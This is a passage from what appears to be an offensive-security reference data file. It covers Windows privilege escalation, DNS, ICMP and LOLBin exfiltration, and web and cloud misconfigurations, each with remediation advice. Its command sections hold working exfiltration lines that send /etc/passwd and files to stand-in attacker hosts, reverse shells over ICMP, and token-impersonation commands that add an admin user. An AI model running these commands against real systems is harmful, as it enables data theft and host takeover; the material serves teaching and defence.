              ["Weak service DACL", "Reconfigure the service binPath → run your code as SYSTEM"],
              ["Unquoted service path", "A writable higher-level directory + space lets Windows run your exe"],
              ["Writable service binary/dir", "Overwrite the executable a SYSTEM service runs"],
              ["AlwaysInstallElevated", "Any MSI installs with SYSTEM privileges"],
              ["Weak registry (service Image​Path)", "Change the binary a service loads via its registry key"],
              ["DLL hijacking / missing DLL", "A SYSTEM process loads a DLL from a writable path"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Enumerate host with winPEAS/PowerUp", "Concrete misconfiguration"],
              ["2", "Weaponise it (repoint/overwrite/MSI)", "Payload set to run as SYSTEM"],
              ["3", "Trigger (restart service / reboot / msiexec)", "Execution as SYSTEM"],
              ["4", "Dump creds / persist", "Full host control"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["winPEAS / Seatbelt", "Automated privilege-escalation enumeration"],
              ["PowerUp (PowerSploit)", "Find and auto-abuse service/registry misconfigs"],
              ["accesschk (Sysinternals)", "Confirm object DACLs (who can change a service)"],
              ["sc.exe / msiexec / msfvenom", "Reconfigure services, install MSI, build payloads"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1543.003 — Windows Service", url: "https://attack.mitre.org/techniques/T1543/003/" },
              { label: "HackTricks — Windows local privilege escalation", url: "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Quote all service binary paths and audit service DACLs so non-admins cannot change configuration.",
              "Restrict write access to service executables and their directories (Program Files should not be user-writable).",
              "Never enable AlwaysInstallElevated; it is a direct SYSTEM primitive for any user.",
              "Run services with the least privilege necessary (a low-priv or gMSA account rather than SYSTEM where possible).",
              "Detect: service binPath changes (event 7040/4697), new services, and MSI installs from user context."
            ]
          }
        ]
      },
      {
        id: "token-impersonation",
        name: "Token Impersonation (Potato Attacks)",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1134/001/",
        theory: "theory/2026-08-18-windows-tokens-uac.html",
        description: "A service account holding SeImpersonatePrivilege can coerce a SYSTEM authentication and impersonate its token to become SYSTEM.",
        brief: "Windows service accounts (IIS, MSSQL, and many others) typically hold <code>SeImpersonatePrivilege</code> — the right to impersonate a token they receive. The 'Potato' family abuses this: coerce a privileged (SYSTEM) process to authenticate to a local listener, capture its token, and impersonate it.\n\nImpact: this turns the common 'I have code execution as a low-privileged service account' situation into SYSTEM on the box — the standard escalation after landing a web shell or SQL command execution as a service identity.",
        quickReference: [
          { label: "Check for the privilege", cmd: "whoami /priv | findstr /i \"SeImpersonate SeAssignPrimaryToken\"" },
          { label: "PrintSpoofer (modern, reliable)", cmd: "PrintSpoofer.exe -i -c cmd.exe" },
          { label: "RoguePotato / GodPotato", cmd: "GodPotato.exe -cmd \"cmd /c whoami\"" },
          { label: "JuicyPotato (older Windows)", cmd: "JuicyPotato.exe -l 1337 -p cmd.exe -a \"/c payload\" -t *" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Confirm SeImpersonatePrivilege on your (service) account", cmd: "whoami /priv | findstr /i \"SeImpersonatePrivilege\"\n# common as IIS APPPOOL\\..., NT SERVICE\\MSSQL..., or after landing a webshell/xp_cmdshell" },
              { label: "2. PrintSpoofer — coerce the spooler's SYSTEM auth (Win10/2019+)", cmd: "PrintSpoofer.exe -i -c cmd.exe\n#   -i   interact with the spawned process\n#   -c   command to run as SYSTEM\n# abuses the print spooler's named-pipe to hand you a SYSTEM token" },
              { label: "3. GodPotato / RoguePotato — DCOM/OXID coercion (broad version support)", cmd: "GodPotato.exe -cmd \"cmd /c net localgroup administrators lowuser /add\"\n# RoguePotato.exe -r <attacker_ip> -e \"cmd.exe\" -l 9999" },
              { label: "4. JuicyPotato — classic (older Windows, before the OXID fixes)", cmd: "JuicyPotato.exe -l 1337 -p c:\\temp\\rev.exe -t * -c {CLSID}\n# pick a CLSID that runs as SYSTEM for the target OS" },
              { label: "5. You are now SYSTEM", cmd: "whoami   # nt authority\\system  ->  dump LSASS / SAM, then move laterally" }
            ]
          },
          {
            title: "The Potato Family",
            type: "table",
            columns: ["Tool", "Best for"],
            rows: [
              ["PrintSpoofer", "Windows 10 / Server 2016-2019+, spooler named-pipe coercion"],
              ["RoguePotato", "Post-JuicyPotato OXID resolver fix; needs a redirector"],
              ["GodPotato", "Broad modern coverage via DCOM"],
              ["JuicyPotato", "Older Windows (pre-2019) using a SYSTEM CLSID"],
              ["Common requirement", "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Code execution as a service account", "Context with SeImpersonate"],
              ["2", "Run a Potato tool", "Coerce a SYSTEM authentication locally"],
              ["3", "Impersonate the captured SYSTEM token", "Execute as SYSTEM"],
              ["4", "Dump credentials / persist", "Full host compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["PrintSpoofer", "Spooler-based SYSTEM impersonation"],
              ["GodPotato / RoguePotato", "DCOM/OXID-based impersonation on modern Windows"],
              ["JuicyPotato", "CLSID-based impersonation on older Windows"],
              ["whoami /priv", "Confirm the required privilege"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1134.001 — Token Impersonation/Theft", url: "https://attack.mitre.org/techniques/T1134/001/" },
              { label: "The Hacker Recipes — Abusing tokens", url: "https://www.thehacker.recipes/ad/movement/access-tokens" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Remove SeImpersonatePrivilege from service accounts that do not require it, and run services least-privileged.",
              "Keep Windows patched; several Potato variants depend on specific unpatched behaviours.",
              "Disable the Print Spooler where it is not needed (also mitigates PrinterBug coercion).",
              "Contain web/SQL service accounts (separate hosts, restricted rights) so a foothold cannot reach SYSTEM easily.",
              "Detect: named-pipe/DCOM coercion patterns and a service account spawning SYSTEM processes."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Exfiltration",
    vulns: [
      {
        id: "dns-exfiltration",
        name: "DNS Exfiltration & Tunneling",
        severity: "Medium",
        ref: "https://attack.mitre.org/techniques/T1048/",
        description: "Encode stolen data into DNS queries so it leaves the network through resolvers that firewalls rarely block or inspect.",
        brief: "DNS is almost always allowed outbound and is rarely deep-inspected, which makes it an ideal covert exfiltration channel. Data is encoded (hex/base32) into the labels of queries for a domain the attacker controls; the authoritative name server they run receives and reassembles it. Interactive tunnels (dnscat2, iodine) build a full bidirectional channel this way.\n\nImpact: an attacker can slowly exfiltrate credentials, files, or command output — and even run an interactive C2 channel — from a segmented network that blocks direct outbound connections, using only DNS.",
        quickReference: [
          { label: "Manual exfil (data in the subdomain)", cmd: "for c in $(cat secret|base32|tr -d '='); do nslookup $c.exfil.attacker.com; done" },
          { label: "dnscat2 (interactive C2 tunnel)", cmd: "server: dnscat2-server exfil.attacker.com\nclient: dnscat2 exfil.attacker.com" },
          { label: "iodine (IP-over-DNS tunnel)", cmd: "server: iodined -f 10.0.0.1 tunnel.attacker.com\nclient: iodine tunnel.attacker.com" },
          { label: "Windows one-liner (exfil a file)", cmd: "$d=[Convert]::ToBase64String((gc secret.txt -Encoding byte)); nslookup \"$d.exfil.attacker.com\"" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Control an authoritative name server for a domain you own", cmd: "# delegate exfil.attacker.com to a server you run; every query for *.exfil.attacker.com\n# is delivered to you, carrying whatever data is in the labels" },
              { label: "2. Manual exfiltration — encode data into query names", cmd: "# base32 avoids case/charset issues in DNS labels\ncat /etc/passwd | base32 -w40 | while read chunk; do\n  nslookup \"$chunk.exfil.attacker.com\" >/dev/null\ndone\n# reassemble the chunks in the order queries arrive at your DNS server" },
              { label: "3. Interactive channel with dnscat2 (encrypted C2 over DNS)", cmd: "# attacker (authoritative server):\ndnscat2-server exfil.attacker.com\n# victim:\ndnscat2 exfil.attacker.com   # full shell/file transfer tunneled in DNS" },
              { label: "4. Full IP tunnel with iodine (route traffic over DNS)", cmd: "# attacker:\nsudo iodined -f -c -P secret 10.0.0.1 tunnel.attacker.com\n# victim:\nsudo iodine -f -P secret tunnel.attacker.com   # a tun interface over DNS" },
              { label: "5. Throttle to blend in", cmd: "# space queries out and keep names plausible; a flood of long random subdomains\n# to one domain is the classic detection signature" }
            ]
          },
          {
            title: "Why DNS Works for Exfil",
            type: "table",
            columns: ["Property", "Consequence"],
            rows: [
              ["Almost always allowed outbound", "Egress filtering rarely blocks DNS"],
              ["Goes via the internal resolver", "Reaches the internet even from segmented networks"],
              ["Rarely deep-inspected", "Payload in labels passes uninspected"],
              ["Recursive resolution", "The attacker's authoritative server receives the data"],
              ["Low and slow", "Small per-query capacity, but persistent"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Register a domain + run its name server", "A collection point for queries"],
              ["2", "Encode data into subdomain labels", "Exfil-ready query stream"],
              ["3", "Issue queries from the victim", "Data delivered to the attacker's NS"],
              ["4", "Reassemble / run dnscat2 tunnel", "Files exfiltrated / interactive C2"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["dnscat2", "Encrypted interactive C2 and file transfer over DNS"],
              ["iodine", "IP-over-DNS tunnel (full network tunnel)"],
              ["nslookup / dig / PowerShell", "Manual query-based exfiltration"],
              ["DNSExfiltrator", "Windows data exfiltration over DNS"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1048 — Exfiltration Over Alternative Protocol", url: "https://attack.mitre.org/techniques/T1048/" },
              { label: "dnscat2", url: "https://github.com/iagox86/dnscat2" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Force all clients through controlled internal resolvers and block direct outbound DNS (UDP/TCP 53) from endpoints.",
              "Monitor DNS for anomalies: high query volume to one domain, long/high-entropy subdomains, and unusual record types (TXT/NULL).",
              "Deploy DNS security (RPZ, threat feeds) and consider DNS logging/inspection at the resolver.",
              "Egress-filter and segment so that even if DNS leaks, other channels are blocked.",
              "Detect: NXDOMAIN spikes, base32/hex-looking labels, and known tunneling tool signatures."
            ]
          }
        ]
      },
      {
        id: "covert-channel-exfil",
        name: "Covert Channel Tunneling (ICMP / Protocol Abuse)",
        severity: "Medium",
        ref: "https://attack.mitre.org/techniques/T1048/",
        description: "Hide data and even interactive shells inside protocols firewalls usually permit — ICMP echo, fragmented IP, or a port already in use.",
        brief: "Beyond DNS, attackers tunnel data inside protocols that egress rules commonly allow. ICMP echo requests/replies (ping) carry arbitrary data payloads; IP fragmentation slips past stateless rules; and tools like tunnelshell open a covert TCP/UDP/ICMP channel that shows no listening process to <code>netstat</code>.\n\nImpact: on a network that blocks normal outbound connections, an attacker can still exfiltrate data and maintain an interactive shell over ICMP or fragmented traffic — channels defenders often forget to inspect.",
        quickReference: [
          { label: "ICMP tunnel (tunnelshell)", cmd: "victim: ./tunneld -t icmp -m echo-reply,echo\nattacker: ./tunnel -t icmp -m echo-reply,echo 10.10.10.2" },
          { label: "Fragmented-IP tunnel", cmd: "victim: ./tunneld -t frag\nattacker: ./tunnel -t frag 10.10.10.2" },
          { label: "ICMP data exfil (icmptunnel / hping3)", cmd: "hping3 -1 -E secret.txt -d 1400 attacker_ip" },
          { label: "Reverse shell over ICMP", cmd: "icmpsh / icmptunnel for interactive shell without opening a TCP port" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. ICMP covert channel — data rides inside ping payloads", cmd: "# tunnelshell: no listening port, invisible to netstat/ps grep on the wire\n# victim (server):\nsudo ./tunneld -t icmp -m echo-reply,echo\n# attacker (client) gets a shell over ICMP:\n./tunnel -t icmp -m echo-reply,echo 10.10.10.2" },
              { label: "2. Fragmented-IP channel — slip past stateless firewall rules", cmd: "# some firewalls pass fragments without the L4 header, permitting them despite rules\n# victim:\nsudo ./tunneld -t frag\n# attacker:\n./tunnel -t frag 10.10.10.2" },
              { label: "3. Quick ICMP file exfil with hping3", cmd: "# push file bytes into ICMP echo data\nhping3 -1 --icmp -E /etc/passwd -d 1400 attacker_ip\n# attacker captures and reassembles with tcpdump/wireshark on icmp" },
              { label: "4. Interactive reverse shell over ICMP (no TCP port)", cmd: "# attacker:\nsudo icmpsh -t <victim_ip> -d 500\n# victim:\nicmpsh.exe -t <attacker_ip>   # shell tunneled entirely in ICMP" },
              { label: "5. Verify stealth", cmd: "# on the victim, the channel shows no TCP/UDP listener:\nnetstat -ano | findstr LISTEN   # nothing for the tunnel\n# detection has to happen on the network, by inspecting ICMP/fragment payloads" }
            ]
          },
          {
            title: "Covert Channels",
            type: "table",
            columns: ["Channel", "How it hides"],
            rows: [
              ["ICMP echo", "Arbitrary data in the ping payload; often allowed outbound"],
              ["IP fragmentation", "Fragments without L4 headers bypass stateless rules"],
              ["HTTP/TCP (no handshake)", "tunnelshell TCP mode reuses a port, no 3-way handshake"],
              ["UDP/DNS", "See DNS Exfiltration"],
              ["No local socket", "tunnelshell shows no PID/port in netstat — host-side blind spot"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Identify an allowed protocol (ICMP/frag)", "A viable covert channel"],
              ["2", "Start the tunnel server on the victim", "Covert listener with no visible socket"],
              ["3", "Connect from outside", "Interactive shell / data channel"],
              ["4", "Exfiltrate data through it", "Data leaves via 'permitted' traffic"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["tunnelshell", "ICMP / frag / TCP / UDP covert channels, no local socket"],
              ["icmpsh / icmptunnel", "Interactive shell over ICMP"],
              ["hping3", "Craft ICMP packets with file data in the payload"],
              ["Wireshark / tcpdump", "Capture and reassemble the covert traffic (attacker side)"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1048 — Exfiltration Over Alternative Protocol", url: "https://attack.mitre.org/techniques/T1048/" },
              { label: "HackingArticles — Data exfiltration (covert channels)", url: "https://www.hackingarticles.in/data-exfiltration/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Egress-filter strictly: block or tightly limit outbound ICMP and enforce that only proxies reach the internet.",
              "Configure firewalls to reassemble/inspect fragments rather than passing headerless fragments.",
              "Inspect ICMP payload sizes and rates; normal ping is small and regular, tunnels are not.",
              "Force outbound traffic through inspecting proxies so raw TCP/UDP/ICMP cannot leave endpoints.",
              "Detect: oversized/asymmetric ICMP, high fragment volume, and known tunneling signatures."
            ]
          }
        ]
      },
      {
        id: "lolbin-exfil",
        name: "Exfiltration via Living-off-the-Land Binaries",
        severity: "Medium",
        ref: "https://attack.mitre.org/techniques/T1567/",
        description: "Use trusted, pre-installed system binaries — curl, wget, certutil, bitsadmin, nc, openssl, even finger and whois — to move data out without dropping tooling.",
        brief: "Every OS ships binaries that can transfer data, and abusing them (LOLBins/GTFOBins) lets an attacker exfiltrate without installing anything that would look out of place. On Linux: curl/wget POST, nc, openssl, bash's /dev/tcp, and even whois/finger/busybox. On Windows: certutil, bitsadmin, PowerShell, and curl.\n\nImpact: because the binaries are signed/trusted and expected on the host, this exfiltration blends into normal activity and evades tooling that watches for unknown executables — a low-effort, high-stealth way to get stolen data off the box.",
        quickReference: [
          { label: "Linux — HTTP POST a file", cmd: "curl -X POST -d @/etc/passwd http://attacker\nwget --post-file=/etc/passwd http://attacker" },
          { label: "Linux — bash /dev/tcp (no tools)", cmd: "bash -c 'cat /etc/passwd > /dev/tcp/attacker/1234'" },
          { label: "Linux — TLS-wrapped exfil", cmd: "openssl s_client -quiet -connect attacker:1234 < /etc/passwd" },
          { label: "Windows — certutil / bitsadmin", cmd: "certutil -encode secret.txt s.b64 & certutil -urlcache -f http://attacker/up (post)\nbitsadmin /transfer j http://attacker/x C:\\x" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Linux HTTP exfil with curl/wget (listener catches the POST)", cmd: "# attacker:  nc -lvp 80\n# victim:\ncurl -X POST -d @/etc/passwd http://attacker_ip\nwget --post-file=/etc/passwd http://attacker_ip" },
              { label: "2. No transfer tool? bash's built-in /dev/tcp", cmd: "# attacker:  nc -lvp 1234\n# victim (bash only):\ncat /etc/passwd > /dev/tcp/attacker_ip/1234\n# or an HTTP-shaped one:\nbash -c 'echo -e \"POST / HTTP/1.0\\n\\n$(</etc/passwd)\" > /dev/tcp/attacker_ip/1234'" },
              { label: "3. Encrypt in transit with openssl (defeats plaintext IDS)", cmd: "# attacker: openssl req -x509 -newkey rsa:4096 -keyout k.pem -out c.pem -days 365 -nodes\n#           openssl s_server -quiet -key k.pem -cert c.pem -port 1234 > loot\n# victim:\nopenssl s_client -quiet -connect attacker_ip:1234 < /etc/passwd" },
              { label: "4. Obscure LOLBins the same idea reaches", cmd: "# nc:      nc attacker_ip 5555 < secret.txt\n# whois:   whois -h attacker_ip -p 43 \"$(cat /etc/passwd)\"\n# finger:  finger \"$(cat /etc/passwd)@attacker_ip\"\n# host an HTTP server to pull instead: busybox httpd -f -p 8080 -h .  /  irb WEBrick" },
              { label: "5. Windows LOLBins", cmd: "certutil -encode C:\\loot.zip C:\\loot.b64   # then POST/upload the b64\nbitsadmin /transfer job /upload http://attacker/up C:\\loot.zip\npowershell -c \"Invoke-RestMethod -Uri http://attacker/up -Method Post -InFile C:\\loot.zip\"\ncurl.exe -X POST --data-binary @C:\\loot.zip http://attacker/up" }
            ]
          },
          {
            title: "Binary → Channel",
            type: "table",
            columns: ["Binary", "Exfil method"],
            rows: [
              ["curl / wget", "HTTP(S) POST / upload"],
              ["nc (netcat)", "Raw TCP transfer"],
              ["bash /dev/tcp", "Pure-shell TCP, no external tool"],
              ["openssl s_client", "TLS-encrypted TCP"],
              ["whois / finger", "Data smuggled into the query argument"],
              ["certutil / bitsadmin (Win)", "Encode + BITS/HTTP transfer"],
              ["busybox httpd / irb WEBrick", "Serve files for the attacker to pull"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Collect and stage the target data", "Loot ready to move"],
              ["2", "Pick a trusted binary already on the host", "No new tooling to flag"],
              ["3", "Transfer via HTTP/TCP/TLS to your listener", "Data leaves as normal-looking traffic"],
              ["4", "Optionally encode/encrypt", "Evades content inspection"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["curl / wget / nc / openssl / bash", "Linux LOLBin transfer channels"],
              ["certutil / bitsadmin / PowerShell / curl.exe", "Windows LOLBin transfer"],
              ["GTFOBins / LOLBAS", "Reference catalogues of abusable binaries"],
              ["netcat (attacker listener)", "Receive the exfiltrated data"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1567 — Exfiltration Over Web Service", url: "https://attack.mitre.org/techniques/T1567/" },
              { label: "GTFOBins", url: "https://gtfobins.github.io/" },
              { label: "LOLBAS (Windows)", url: "https://lolbas-project.github.io/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enforce egress filtering: endpoints should reach the internet only through inspecting proxies, not arbitrary hosts/ports.",
              "Apply application allow-listing and command-line logging so LOLBin misuse (certutil/bitsadmin encoding, /dev/tcp) is visible.",
              "Monitor for anomalous outbound connections from server processes and unusual use of transfer binaries.",
              "Use DLP to detect sensitive data leaving over HTTP/HTTPS, and restrict where servers can connect.",
              "Detect: certutil -encode/-urlcache, bitsadmin transfers, bash /dev/tcp, and curl/wget POSTing local files."
            ]
          }
        ]
      }
    ]
  },
    {
    category: "Misconfigurations",
    vulns: [
      {
        "id": "sensitive-data-exposure",
        "name": "Sensitive Data Exposure",
        "severity": "High",
        "ref": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/",
        "description": "Sensitive data (cards, credentials, personal or health data, tokens) is transmitted, stored, logged, or displayed without adequate protection.",
        "brief": "Sensitive data exposure is not a single injection bug but a class of handling failures: card numbers or CVVs passing through and being stored by the application instead of tokenised to a processor; passwords stored with weak or no hashing; personal data returned in API responses beyond what the UI needs; secrets and tokens embedded in URLs (and therefore in browser history, Referer headers, proxy logs, and access logs); or sensitive pages cached by browsers and shared proxies.\n\nThe damage rarely comes from a clever exploit - it comes from the data simply being reachable, cacheable, or loggable by someone who should not have it. It underpins large breaches and carries direct regulatory weight (PCI-DSS for card data, GDPR/HIPAA for personal and health data).",
        "quickReference": [
          { "label": "Card data in the request", "cmd": "check whether the PAN / CVV hit YOUR backend at all, or go straight to the processor's iframe/token" },
          { "label": "Secrets in the URL", "cmd": "look for ?token= / ?reset= / ?api_key= in links, redirects, and history" },
          { "label": "Caching of private pages", "cmd": "curl -sI https://target/account | grep -i 'cache-control\\|pragma\\|expires'" },
          { "label": "Over-exposed API fields", "cmd": "diff what the API returns against what the UI shows (password hashes, other users' PII)" }
        ],
        "sections": [
          { "title": "How It's Observed", "type": "commands", "commands": [
            { "label": "1. Inspect transmission", "cmd": "# proxy the payment/login flow and read the raw requests\n# does the PAN/CVV/password appear in a request to the app's own domain?\n# is everything over HTTPS with HSTS, or is any leg plaintext?" },
            { "label": "2. Hunt secrets in URLs", "cmd": "# tokens in the query string leak via Referer, history, and logs\ngrep -rEi 'token=|reset=|api_?key=|sessionid=' <collected-urls>" },
            { "label": "3. Check caching of sensitive responses", "cmd": "curl -sI https://target/account -H 'Cookie: session=...' | grep -i 'cache-control\\|expires\\|pragma'\n# no-store/no-cache/private expected on authenticated pages" },
            { "label": "4. Compare API output to need", "cmd": "# request a profile/object and look for fields the UI never shows:\n# password hashes, internal ids, other users' PII, full card data" }
          ]},
          { "title": "Common Failure Points", "type": "table", "columns": ["Location", "Exposure"], "rows": [
            ["Card data through the app", "PCI scope + breach risk; should be tokenised to the processor"],
            ["Secrets in the URL", "Leak via history, Referer, proxy and server logs"],
            ["Weak/absent hashing", "Stored passwords cracked wholesale after any DB leak"],
            ["Over-broad API responses", "PII and internal fields returned beyond the UI's need"],
            ["Cacheable private pages", "Personal data served to the next user of a shared cache"],
            ["Plaintext / mixed content", "Data readable on the wire; downgrade attacks"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP - Sensitive Data Exposure / Cryptographic Failures", "url": "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" },
            { "label": "OWASP WSTG - Testing for Weak Cryptography", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Never let raw card data touch the application - use the processor's hosted fields or tokenisation so the app only ever sees a token.",
            "Keep secrets and tokens out of URLs; pass them in headers or POST bodies, and give them short lifetimes.",
            "Encrypt sensitive data in transit (TLS everywhere, HSTS) and at rest, and hash passwords with a strong, salted, adaptive algorithm (bcrypt/argon2).",
            "Return only the fields each response needs; do not lean on the UI to hide data the API still sends.",
            "Set Cache-Control: no-store (and matching Pragma/Expires) on every authenticated or sensitive response.",
            "Scrub sensitive values from application, access, and error logs."
          ]}
        ]
      },
      {
        "id": "vhost-misconfig",
        "name": "Virtual Host Misconfiguration",
        "severity": "Medium",
        "ref": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/",
        "description": "A server hosting multiple virtual hosts exposes internal, staging, or neighbouring sites through the Host header - sites DNS never advertises.",
        "brief": "One IP address commonly serves many sites, and the web server decides which to return based on the Host header. When configuration is loose, an attacker who sets the Host header by hand can reach virtual hosts that were never meant to be public: staging and admin instances, internal tools, or default/catch-all sites bound to the same server. Because these hosts have no public DNS record, they are invisible to normal enumeration yet fully reachable once you know (or guess) the name.\n\nRelated failures include weak isolation between co-tenants on shared infrastructure and default virtual hosts that leak server information. It frequently chains with Host header injection, and reaching a hidden staging app often exposes weaker authentication and unpatched code.",
        "quickReference": [
          { "label": "Manually request a vhost", "cmd": "curl -s -H 'Host: staging.target.com' https://<target-ip>/ " },
          { "label": "Brute-force virtual hosts", "cmd": "ffuf -w vhosts.txt -u https://<ip>/ -H 'Host: FUZZ.target.com' -fs <baseline-size>" },
          { "label": "Dedicated scanner", "cmd": "VHostScan -t <target-ip> -w wordlist.txt" },
          { "label": "Probe the default vhost", "cmd": "curl -s -H 'Host: nonexistent.invalid' https://<target-ip>/  (what does the catch-all serve?)" }
        ],
        "sections": [
          { "title": "How It's Tested", "type": "commands", "commands": [
            { "label": "1. Baseline the IP directly", "cmd": "# what does the server return for its IP with a bogus Host?\ncurl -s -H 'Host: doesnotexist.example' https://<target-ip>/ -k -o /dev/null -w '%{size_download}\\n'" },
            { "label": "2. Brute-force candidate vhosts", "cmd": "ffuf -w subdomains.txt -u https://<target-ip>/ -H 'Host: FUZZ.target.com' -k -fs <baseline>\n# filter out the baseline size to reveal distinct hosts" },
            { "label": "3. Use a purpose-built tool", "cmd": "VHostScan -t <target-ip> -oN vhosts.txt\n# flags catch-all pages and clusters distinct responses" },
            { "label": "4. Chase what surfaces", "cmd": "# hit any hidden admin/staging vhost found and test it as its own app\n# these often run older code with weaker auth" }
          ]},
          { "title": "What It Exposes", "type": "table", "columns": ["Hidden host type", "Why it matters"], "rows": [
            ["Staging / QA", "Debug features, weaker auth, unpatched or unreleased code"],
            ["Admin / internal tools", "High-privilege functionality not meant to be public"],
            ["Default / catch-all vhost", "Server version, sample pages, and config disclosure"],
            ["Co-tenant sites", "Weak isolation lets a neighbour become a pivot"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP WSTG - Configuration and Deployment Management Testing", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/" },
            { "label": "VHostScan", "url": "https://github.com/codingo/VHostScan" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Do not bind internal, staging, or admin sites to the same public-facing server as production; isolate them by network, not just by an unadvertised Host name.",
            "Configure an explicit default virtual host that returns a neutral page or an error, rather than leaking a real site or server details for unknown Host values.",
            "Restrict non-production and administrative virtual hosts by IP allow-list, VPN, or authentication at the edge.",
            "On shared infrastructure, enforce strong tenant isolation (separate accounts, filesystems, and database credentials).",
            "Validate the Host header against an allow-list so unexpected values are rejected."
          ]}
        ]
      },
      {
        "id": "cloud-storage-misconfig",
        "name": "Cloud Storage Misconfiguration",
        "severity": "High",
        "ref": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage",
        "description": "Cloud storage buckets (S3, GCS, Azure Blob) are readable, listable, or writable by anyone, exposing or allowing tampering with stored data.",
        "brief": "Applications increasingly serve assets and store uploads in cloud object storage. When the bucket's access policy is too permissive, the consequences scale with the data it holds. Public list permission lets anyone enumerate every object; public read exposes documents, backups, and user uploads directly; and - the most dangerous - public write lets an attacker overwrite the files the site serves, planting malicious JavaScript, defacing content, or replacing downloads with malware, all from a trusted origin.\n\nBuckets are discoverable from asset URLs, JavaScript, and predictable names based on the organisation, so they are a routine, high-yield check. Misconfiguration is a configuration failure rather than a code bug, which is why it is so common and so often overlooked.",
        "quickReference": [
          { "label": "Test S3 listing", "cmd": "curl -s https://<bucket>.s3.amazonaws.com/   (XML listing = public list)" },
          { "label": "Test read on an object", "cmd": "curl -s https://<bucket>.s3.amazonaws.com/<key> -o out && file out" },
          { "label": "Test write (most critical)", "cmd": "curl -s -X PUT https://<bucket>.s3.amazonaws.com/poc.txt -d 'poc'  ->  then GET it back" },
          { "label": "Discover buckets", "cmd": "cloud_enum -k <org>   /   check asset hostnames in page + JS" }
        ],
        "sections": [
          { "title": "How It's Tested", "type": "commands", "commands": [
            { "label": "1. Find the buckets", "cmd": "# from served assets and JavaScript, and by guessing org-based names\ncloud_enum -k targetcorp -k target-corp -k targetcdn" },
            { "label": "2. Test anonymous list and read", "cmd": "aws s3 ls s3://<bucket> --no-sign-request\naws s3 cp s3://<bucket>/<key> . --no-sign-request\n# or plain curl to the bucket URL" },
            { "label": "3. Test anonymous write (with authorisation)", "cmd": "echo poc > poc.txt\naws s3 cp poc.txt s3://<bucket>/poc.txt --no-sign-request\n# success = attacker can replace served content" },
            { "label": "4. Check ACLs / policy", "cmd": "aws s3api get-bucket-acl --bucket <bucket> --no-sign-request\naws s3api get-bucket-policy --bucket <bucket> --no-sign-request" }
          ]},
          { "title": "Permission Impact", "type": "table", "columns": ["Public permission", "Impact"], "rows": [
            ["List", "Enumerate every object name in the bucket"],
            ["Read", "Download documents, backups, and user uploads"],
            ["Write", "Overwrite served files - stored XSS, defacement, malware delivery from a trusted origin"],
            ["Full control / ACL", "Take over the bucket entirely"]
          ]},
          { "title": "References", "type": "references", "items": [
            { "label": "OWASP WSTG - Test Cloud Storage", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage" },
            { "label": "AWS - S3 Security Best Practices", "url": "https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html" }
          ]},
          { "title": "Remediation", "type": "notes", "items": [
            "Block public access at the account and bucket level by default (e.g. S3 Block Public Access) and grant access only through signed URLs or a CDN with an origin-access identity.",
            "Never grant anonymous write; scope write permissions to specific authenticated principals with least privilege.",
